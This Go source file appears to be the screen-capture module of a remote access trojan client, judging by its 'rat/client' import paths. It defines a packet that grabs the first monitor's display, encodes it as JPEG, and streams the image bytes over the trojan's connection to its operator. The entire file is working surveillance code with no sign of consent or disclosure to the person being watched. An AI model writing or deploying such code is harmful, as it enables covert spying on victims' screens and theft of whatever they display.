package main

import (
	"bytes"
	"image/jpeg"
	"rat/client/screen"
	"rat/common"
)

type ScreenPacket struct {
	OutgoingPacket
}

func (packet ScreenPacket) GetHeader() common.PacketHeader {
	return common.ScreenHeader
}

func (packet ScreenPacket) Write(c *Connection) error {
	screen.QueryMonitors()

	var w bytes.Buffer

	jpeg.Encode(&w, screen.Capture(screen.Monitors[0]), &jpeg.Options{
		Quality: 75,
	})

	c.WriteInt(int32(len(w.Bytes())))
	c.Write(w.Bytes())

	return nil
}
